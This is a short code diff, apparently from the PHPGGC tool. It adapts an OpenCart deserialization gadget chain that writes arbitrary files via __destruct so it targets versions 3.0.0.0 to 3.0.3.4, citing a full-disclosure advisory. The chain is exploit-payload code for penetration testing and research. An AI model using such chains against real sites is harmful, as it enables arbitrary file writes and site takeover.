@@ -2,9 +2,9 @@
 
 namespace GadgetChain\OpenCart;
 
-class FW2 extends \PHPGGC\GadgetChain\FileWrite
+class FW3 extends \PHPGGC\GadgetChain\FileWrite
 {
-    public static $version = '3.0.3.5 <= 3.0.4.0+';
+    public static $version = '3.0.0.0 <= 3.0.3.4';
     public static $vector = '__destruct';
     public static $author = 'mcdruid';
     public static $information = 'The gadget chain is documented here: https://seclists.org/fulldisclosure/2022/May/30';
@@ -16,7 +16,7 @@ class FW2 extends \PHPGGC\GadgetChain\FileWrite
 
         return new \DB\MySQLi(
             new \Session(
-                new \Twig\Cache\FilesystemCache(),
+                new \Twig_Cache_Filesystem(),
                 $path,
                 $data
             )
